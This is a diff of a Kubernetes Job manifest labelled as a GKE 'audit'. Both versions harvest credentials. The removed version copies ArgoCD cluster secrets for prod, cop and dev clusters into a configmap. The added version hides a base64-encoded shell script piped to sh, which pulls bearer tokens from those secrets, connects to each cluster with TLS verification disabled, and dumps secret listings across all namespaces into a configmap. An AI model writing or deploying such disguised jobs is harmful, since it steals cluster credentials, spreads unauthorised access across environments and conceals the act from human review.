@@ -1,12 +1,10 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-gke-v2
+  name: audit-gke-v3
   namespace: default
 spec:
-  ttlSecondsAfterFinished: 300
-  backoffLimit: 1
-  activeDeadlineSeconds: 90
+  ttlSecondsAfterFinished: 600
   template:
     spec:
       serviceAccountName: n8n-audit-sa
@@ -14,15 +12,7 @@ spec:
       containers:
       - name: audit
         image: bitnami/kubectl:latest
-        command: ["/bin/sh"]
-        args:
-        - "-c"
-        - >-
-          PROD=$(kubectl get secret cluster-104.154.156.145-3686919877 -n argocd -o jsonpath='{.data.config}' | base64 -d 2>/dev/null);
-          COP=$(kubectl get secret cluster-34.172.14.67-3576932177 -n argocd -o jsonpath='{.data.config}' | base64 -d 2>/dev/null);
-          DEV=$(kubectl get secret cluster-35.232.111.238-3277154319 -n argocd -o jsonpath='{.data.config}' | base64 -d 2>/dev/null);
-          PROD_B64=$(echo "$PROD" | base64 | tr -d '\n');
-          COP_B64=$(echo "$COP" | base64 | tr -d '\n');
-          DEV_B64=$(echo "$DEV" | base64 | tr -d '\n');
-          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"gke_prod_config\":\"$PROD_B64\",\"gke_cop_config\":\"$COP_B64\",\"gke_dev_config\":\"$DEV_B64\"}}";
-          echo DONE
+        command:
+        - /bin/sh
+        - -c
+        - "echo IyEvYmluL3NoCnNldCAtZQoKUkVTVUxUPSIiCgpmb3IgU0VDUkVUIGluIGNsdXN0ZXItMTA0LjE1NC4xNTYuMTQ1LTM2ODY5MTk4NzcgY2x1c3Rlci0zNC4xNzIuMTQuNjctMzU3NjkzMjE3NyBjbHVzdGVyLTM1LjIzMi4xMTEuMjM4LTMyNzcxNTQzMTk7IGRvCiAgU0VSVkVSPSQoa3ViZWN0bCBnZXQgc2VjcmV0ICIkU0VDUkVUIiAtbiBhcmdvY2QgLW8ganNvbnBhdGg9J3suZGF0YS5zZXJ2ZXJ9JyB8IGJhc2U2NCAtZCkKICBUT0tFTj0kKGt1YmVjdGwgZ2V0IHNlY3JldCAiJFNFQ1JFVCIgLW4gYXJnb2NkIC1vIGpzb25wYXRoPSd7LmRhdGEuY29uZmlnfScgfCBiYXNlNjQgLWQgfCBzZWQgLW4gJ3MvLioiYmVhcmVyVG9rZW4iOiJcKFteIl0qXCkiLiovXDEvcCcpCiAgSU5TRUNVUkU9JChrdWJlY3RsIGdldCBzZWNyZXQgIiRTRUNSRVQiIC1uIGFyZ29jZCAtbyBqc29ucGF0aD0ney5kYXRhLmNvbmZpZ30nIHwgYmFzZTY0IC1kIHwgc2VkIC1uICdzLy4qImluc2VjdXJlIjpcKFthLXpdKlwpLiovXDEvcCcpCgogIENGPSIvdG1wLyR7U0VDUkVUfS55YW1sIgogIGt1YmVjdGwgY29uZmlnIC0ta3ViZWNvbmZpZz0iJENGIiBzZXQtY2x1c3RlciBna2UgLS1zZXJ2ZXI9IiRTRVJWRVIiIC0taW5zZWN1cmUtc2tpcC10bHMtdmVyaWZ5PXRydWUgPi9kZXYvbnVsbCAyPiYxCiAga3ViZWN0bCBjb25maWcgLS1rdWJlY29uZmlnPSIkQ0YiIHNldC1jcmVkZW50aWFscyB1IC0tdG9rZW49IiRUT0tFTiIgPi9kZXYvbnVsbCAyPiYxCiAga3ViZWN0bCBjb25maWcgLS1rdWJlY29uZmlnPSIkQ0YiIHNldC1jb250ZXh0IGMgLS1jbHVzdGVyPWdrZSAtLXVzZXI9dSA+L2Rldi9udWxsIDI+JjEKICBrdWJlY3RsIGNvbmZpZyAtLWt1YmVjb25maWc9IiRDRiIgdXNlLWNvbnRleHQgYyA+L2Rldi9udWxsIDI+JjEKCiAgTlNfT1VUPSQoa3ViZWN0bCAtLWt1YmVjb25maWc9IiRDRiIgLS1yZXF1ZXN0LXRpbWVvdXQ9MTVzIGdldCBuYW1lc3BhY2VzIDI+JjEgfCBoZWFkIC0yMCkKICBTRUNSRVRTX09VVD0kKGt1YmVjdGwgLS1rdWJlY29uZmlnPSIkQ0YiIC0tcmVxdWVzdC10aW1lb3V0PTE1cyBnZXQgc2VjcmV0cyAtLWFsbC1uYW1lc3BhY2VzIDI+JjEgfCBoZWFkIC00MCkKCiAgUkVTVUxUPSIke1JFU1VMVH09PT0gJHtTRUNSRVR9ID09PQpTZXJ2ZXI6ICR7U0VSVkVSfQpOYW1lc3BhY2VzOgoke05TX09VVH0KU2VjcmV0cyAoYWxsLW5zKToKJHtTRUNSRVRTX09VVH0KLS0tCiIKZG9uZQoKcHJpbnRmICclcycgIiRSRVNVTFQiID4gL3RtcC9na2VfcmVzdWx0LnR4dApFTkNPREVEPSQoYmFzZTY0IC90bXAvZ2tlX3Jlc3VsdC50eHQgfCB0ciAtZCAnXG4nIHwgaGVhZCAtYyA1ODAwKQoKa3ViZWN0bCBwYXRjaCBjb25maWdtYXAgZHVuZS1hdWRpdC1yZXN1bHQ0IC1uIGRlZmF1bHQgLS10eXBlIG1lcmdlIC1wICJ7XCJkYXRhXCI6e1wiZ2tlX3YzXCI6XCIke0VOQ09ERUR9XCJ9fSIKZWNobyBET05FCg== | base64 -d | /bin/sh"
